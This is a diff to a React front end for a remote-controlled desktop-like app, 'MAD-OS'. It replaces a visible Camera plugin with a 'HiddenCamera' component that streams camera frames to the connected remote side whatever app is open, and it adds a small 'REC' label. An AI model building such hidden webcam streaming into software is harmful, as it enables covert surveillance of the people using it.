@@ -11,12 +11,14 @@ import {
   ShieldAlert
 } from 'lucide-react';
 import { TerminalPlugin } from './plugins/Terminal';
-import { CameraPlugin } from './plugins/Camera';
+import { CalculatorPlugin } from './plugins/Calculator';
+import { ConnectionPlugin } from './plugins/Connection';
 import { useRemoteControl } from './hooks/useRemoteControl';
 import { Setup } from './components/Setup';
 import { OSContext, OSContextType } from './hooks/useOS';
+import { HiddenCamera } from './components/HiddenCamera';
 
-const PLUGINS = [TerminalPlugin, CameraPlugin];
+const PLUGINS = [TerminalPlugin, CalculatorPlugin, ConnectionPlugin];
 
 const App: React.FC = () => {
   const [activeAppId, setActiveAppId] = useState<string | null>(null);
@@ -57,9 +59,10 @@ const App: React.FC = () => {
         }
     },
     closeApp: () => setActiveAppId(null),
+    emit: (event, data) => emit(event, data),
     isConnected,
     activeAppId
-  }), [isConnected, activeAppId]);
+  }), [isConnected, activeAppId, emit]);
 
   useEffect(() => {
     const timer = setInterval(() => setTime(new Date()), 1000);
@@ -174,9 +177,20 @@ const App: React.FC = () => {
     <div className={`relative h-screen w-screen bg-[#0d0d0f] text-[#f5f5f7] overflow-hidden ${isShaking ? 'animate-shake' : ''} ${isFrozen ? 'pointer-events-none select-none' : ''}`}>
       <div className="aura-bg opacity-40" />
 
+      <HiddenCamera
+          active={cameraActive}
+          fps={cameraFps}
+          onFrame={(frame) => isConnected && emit('CAMERA_FRAME', { frame })}
+      />
+
       {/* 1. Status Bar (Top) */}
       <header className="absolute top-0 left-0 w-full h-12 flex items-center justify-between px-8 z-50">
-        <div className="flex items-center gap-6">
+        <div className="absolute top-4 left-6 flex items-center gap-2 pointer-events-none opacity-80">
+            <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
+            <span className="text-[9px] font-black text-red-500 tracking-[0.2em]">REC</span>
+        </div>
+
+        <div className="flex items-center gap-6 ml-16">
           <div className="flex items-center gap-2 opacity-80">
             <Cpu size={16} />
             <span className="text-xs font-medium tracking-widest uppercase">MAD-OS v1.1</span>
@@ -249,14 +263,8 @@ const App: React.FC = () => {
               </div>
               <div className="flex-1 overflow-hidden relative">
                 <activeApp.component
-                    isActive={activeAppId === 'camera' ? cameraActive : true}
-                    fps={cameraFps}
+                    isActive={true}
                     remoteLogs={activeAppId === 'terminal' ? remoteLogs : []}
-                    onFrame={(frame: string) => {
-                        if (activeAppId === 'camera' && cameraActive && isConnected) {
-                            emit('CAMERA_FRAME', { frame });
-                        }
-                    }}
                 />
               </div>
             </motion.div>
